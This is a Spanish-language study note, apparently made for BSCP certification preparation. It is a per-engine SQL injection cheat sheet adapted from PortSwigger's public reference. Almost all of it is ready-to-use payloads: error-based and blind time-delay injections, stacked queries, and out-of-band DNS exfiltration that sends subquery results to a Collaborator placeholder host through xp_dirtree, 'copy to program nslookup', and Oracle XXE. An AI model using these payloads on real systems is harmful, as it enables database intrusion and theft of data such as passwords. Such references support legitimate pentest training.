---
tipo: recurso
tags: [bscp, tipo/recurso, vuln/sqli]
---

# 🗃️ Referencia SQLi por motor (Oracle · MSSQL · PostgreSQL · MySQL)

> Sintaxis útil por motor, adaptada de la **cheat sheet oficial de PortSwigger** (ver [[Fuentes-Fiables]]).
> Fuente: https://portswigger.net/web-security/sql-injection/cheat-sheet · Metodología en [[CS-SQLi]].
> Placeholders: `{{COND}}` = condición booleana · `{{TABLE}}` = tabla · `{{SUBQ}}` = subconsulta a exfiltrar · `{{COLLAB}}` = subdominio de Collaborator.

## Concatenar cadenas
| Motor | Sintaxis |
|---|---|
| Oracle | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar'` |
| MySQL | `'foo' 'bar'` (espacio entre ellas) · `CONCAT('foo','bar')` |

## Substring (offset 1-based; devuelve `ba`)
| Motor | Sintaxis |
|---|---|
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft / PostgreSQL / MySQL | `SUBSTRING('foobar', 4, 2)` |

## Comentarios
| Motor | Sintaxis |
|---|---|
| Oracle | `--comentario` |
| Microsoft / PostgreSQL | `--comentario` · `/*comentario*/` |
| MySQL | `#comentario` · `-- comentario` (**espacio tras `--`**) · `/*comentario*/` |

## Versión del motor
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT banner FROM v$version` · `SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

## Contenido de la BD (tablas y columnas)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT * FROM all_tables` · `SELECT * FROM all_tab_columns WHERE table_name = '{{TABLE}}'` |
| Microsoft / PostgreSQL / MySQL | `SELECT * FROM information_schema.tables` · `SELECT * FROM information_schema.columns WHERE table_name = '{{TABLE}}'` |

## Errores condicionales (error si `{{COND}}` es true)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT CASE WHEN ({{COND}}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN ({{COND}}) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN ({{COND}}) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF({{COND}},(SELECT table_name FROM information_schema.tables),'a')` |

## Extraer datos por mensaje de error
| Motor | Sintaxis |
|---|---|
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT '{{SUBQ}}')` → *Conversion failed…* |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → *invalid input syntax for integer* |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT '{{SUBQ}}')))` → *XPATH syntax error* |

## Batched / stacked queries
| Motor | Sintaxis |
|---|---|
| Oracle | No soporta batched. |
| Microsoft / PostgreSQL / MySQL | `QUERY-1; QUERY-2` |
- ⚠️ En **MySQL** normalmente **no** sirve para SQLi (salvo ciertas APIs PHP/Python). Útil sobre todo en ciegas (DNS, error o time delay).

## Time delay (10 s, incondicional)
| Motor | Sintaxis |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

## Time delay condicional (si `{{COND}}`)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT CASE WHEN ({{COND}}) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF ({{COND}}) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN ({{COND}}) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF({{COND}},SLEEP(10),'a')` |

## DNS lookup (OAST con Collaborator `{{COLLAB}}`)
| Motor | Sintaxis |
|---|---|
| Oracle (patchado, requiere privilegios) | `SELECT UTL_INADDR.get_host_address('{{COLLAB}}')` |
| Oracle (XXE, instalaciones sin parchear) | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{COLLAB}}/"> %remote;]>'),'/l') FROM dual` |
| Microsoft | `exec master..xp_dirtree '//{{COLLAB}}/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup {{COLLAB}}'` |
| MySQL (solo Windows) | `LOAD_FILE('\\\\{{COLLAB}}\\a')` · `SELECT ... INTO OUTFILE '\\\\{{COLLAB}}\a'` |

## DNS lookup + exfiltración (`{{SUBQ}}` en el subdominio)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT {{SUBQ}})\|\|'.{{COLLAB}}/"> %remote;]>'),'/l') FROM dual` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT {{SUBQ}});exec('master..xp_dirtree "//'+@p+'.{{COLLAB}}/a"')` |
| PostgreSQL | función `plpgsql` con `copy ... to program 'nslookup <dato>.{{COLLAB}}'` (ver fuente oficial) |
| MySQL (solo Windows) | `SELECT {{SUBQ}} INTO OUTFILE '\\\\{{COLLAB}}\a'` |

## Enlaces
- [[CS-SQLi]] · [[Fuentes-Fiables]] · [[Triage-Deteccion]] · [[MOC-BSCP]]
- Oficial: https://portswigger.net/web-security/sql-injection/cheat-sheet
